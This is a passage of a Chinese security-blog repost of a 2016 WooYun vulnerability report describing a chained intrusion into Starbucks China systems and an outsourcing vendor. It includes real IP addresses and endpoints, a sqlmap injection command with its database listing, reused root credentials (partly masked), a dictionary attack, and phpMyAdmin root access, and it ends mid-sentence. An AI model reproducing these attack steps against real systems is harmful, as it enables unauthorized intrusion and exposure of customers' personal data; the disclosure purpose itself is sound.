---
title: 实战 | 猪猪侠以前的星巴克漏洞挖掘文章
url: https://www.secpulse.com/archives/198427.html
source: 安全脉搏
date: 2023-03-31
fetch_date: 2025-10-04T11:12:41.253261
---

# 实战 | 猪猪侠以前的星巴克漏洞挖掘文章

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 实战 | 猪猪侠以前的星巴克漏洞挖掘文章

[漏洞](https://www.secpulse.com/archives/category/vul)

[HACK\_Learn](https://www.secpulse.com/newpage/author?author_id=8971)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-03-30

11,771

###

### 来源：http://wooyun.2xss.cc/bug\_detail.php?wybug\_id=wooyun-2016-0208769

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148570.png)

这是一篇2016年的乌云漏洞报告，带大家感受一下2016年的猪哥就这么强了

现在回看这篇文章，依旧能感受到猪哥的力量！

如有侵权，请私信删除

### **简要描述：**

星巴克中国用户敏感信息遍历漏洞 (从不可能利用到可能)
本报告通过多个漏洞的组合，进而突破限制，遍历任意用户信息。
信息包含用户的：用户名、邮箱、密码、家庭地址、手机号等等（PS：密码是明文的）
太标准的东西，墨守成规的东西，往往都容易被预测

### **详细说明：**

**#1 漏洞的起因**
2014年报告了一个星巴克备份文件下载的漏洞，其中包含几项重要的信息
WooYun: 星巴克官网备份可下载导致敏感信息泄露(含操作系统Administrator密码)
两个部署在内网的WebService:

```
http://172.16.1.32:8002/StarbucksGCService.svc // 星巴克官网后台
http://172.16.1.32:8888/Service1.svc // 星巴克处理用户信息的接口
```

**#2 漏洞发现**
一直没空关注星巴克的系统，前天去买星冰粽，服务员叫我扫会员卡，手机APP提示我的二维码过期，也就是星巴克的系统进行了一次重大更新，就顺便看了一下；
新的服务器架构从 .NET 切换至 PHP，但是服务器却增多了
通过扫描 www.starbucks.com.cn 180.153.48.188 网段开放的WEB服务，一个默认页面的信息引起了我的注意。

```
http://180.153.48.178:803/
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148573.png)

这不就是上面提到的Service1.svc么？深入研究分析，得知这是一个.NET的WebService，里面存在几个关键方法

```
public string GetCustomer(long CustomerId, out MSR.Model.MSR_Customer oCustomer)
   {
      GetCustomerRequest inValue = new GetCustomerRequest();
      inValue.CustomerId = CustomerId;
      GetCustomerResponse retVal = ((IService1)(this)).GetCustomer(inValue);
      oCustomer = retVal.oCustomer;
      return retVal.GetCustomerResult;
   }
```

根据客户的ID，获取完整的客户信息，返回的用户信息如下

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148576.png)

**#3 WebService利用**
可以直接用Visual Studio生成对应的 .NET cs 文件

```
svcutil.exe http://180.153.48.178:803/Service1.svc?wsdl
```

**#4 利用，直接获取customerID 为 2 的用户信息**（这里只是测试环境的数据，后面会介绍如何找到真实环境）

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148583.png)

**#5 进一步挖掘**
通过访问https://180.153.48.178的页面内容，发现这是今年3月份之前的网站版本

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148590.png)

其中有两处地方泄露了另外的WebService
https://180.153.48.178/js/hasjs.js

```
var domainMSRURL = 'https://staging.rewards.flipscript.com.cn/';
var domainSVCURL = "http://218.80.216.34:8010/";
var domianWebURL = "http://218.80.216.34:8012/";
//domainMSRURL = "http://localhost:49960/MSR/";
```

https://180.153.48.178/interface/MSR.ashx

```
// JavaScript Document
var domainMSRURL = 'http://218.80.216.34:805/';
var domainSVCURL = "http://218.80.216.34:8010/";
var domianWebURL = "http://218.80.216.34:8012/";
//domainMSRURL = "http://localhost:49960/MSR/"; document.write('
```

**#6 这个服务器上的某个.svc怎么那么眼熟呢？不就是开始提到的StarbucksGCService.svc吗？**
至此，两个关键的WebService都找到了，还有星巴克的后台

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148599.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148607.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148610.png)

Service1.svc 有个 GetAdminList的方法，你懂的，查询出所有后台管理员的信息

```
public string GetAdminList(int nPageSize, int nPageIndex, out MSR.Model.MSR_Admin[] oAdminList, out int nCount)    {        GetAdminListRequest inValue = new GetAdminListRequest();        inValue.nPageSize = nPageSize;        inValue.nPageIndex = nPageIndex;        GetAdminListResponse retVal = ((IService1)(this)).GetAdminList(inValue);        oAdminList = retVal.oAdminList;        nCount = retVal.nCount;        return retVal.GetAdminListResult;    }
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148611.png)

### **漏洞证明：**

**#7 以战养战，信息组合**

整理一下发型，梳理一下所有信息，得到关键的因素
上面所有的信息， 都属于测试环境的，那么接下来就需要突破到真实环境了；
关键信息点：
从https://180.153.48.178的SSL证书，得知星巴克的系统是外包给flipscript公司开发的，
flipscript公司被DeepFocus公司收购了；

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148621.png)

**#8 从flipscript & DeepFocus下手**
开启神器，发现http://cn.deepfocus.net一枚注入漏洞

```
python sqlmap.py -u "https://cn.deepfocus.net/tasoap/tasoap.php?key=Fly&id=1" -p key --dbs
```

```
available databases [20]:
[*] bugtracker
[*] channelx
[*] deepfocus
[*] dftest
[*] dnsw
[*] fair
[*] ftpusers
[*] information_schema
[*] mac
[*] mmj
[*] mysql
[*] ra
[*] TADB
[*] test
[*] torres
[*] wordpress
[*] wx
[*] yioulai
[*] yioulaisz
[*] YOLDB
```

mysql是root权限，那就直接root服务器吧, ssh 登录

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148624.png)

这台服务器里面有个bug.flipscript.net的Mantis管理工具，刚好证明了和星巴克有关联

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148632.png)

发现了一处关键信息

```
/** WordPress数据库的名称 */
define('DB_NAME', 'wordpress');
/** MySQL数据库用户名 */
define('DB_USER', 'root');
/** MySQL数据库密码 *
/define('DB_PASSWORD', '*****@05****');
/** MySQL主机 *
/define('DB_HOST', 'localhost');
```

**#9 峰回路转**
整理好这些东西，咱们来到www.flipscript.com.cn，配置好神器，字典一挂，扫除了mssql对外开放，SA密码为：MYSQL数据库一样的密码；

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148636.png)

**#10 有了这些信息之后，就能重新以新的角度来审视星巴克中国了**

开启神器，发现一个phpmyadmin，用那个从DeepFocus得到的ROOT密码，直接root权限进入

```
http://cn.chinatimeline.starbucks.com.cn/phpmyadmin/
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198427-1680148639.png)

这里又刚好还有一个WordPress: http://chinatimeline.starbucks.com.cn/ ，整点东西证明我来过。
http://chinati...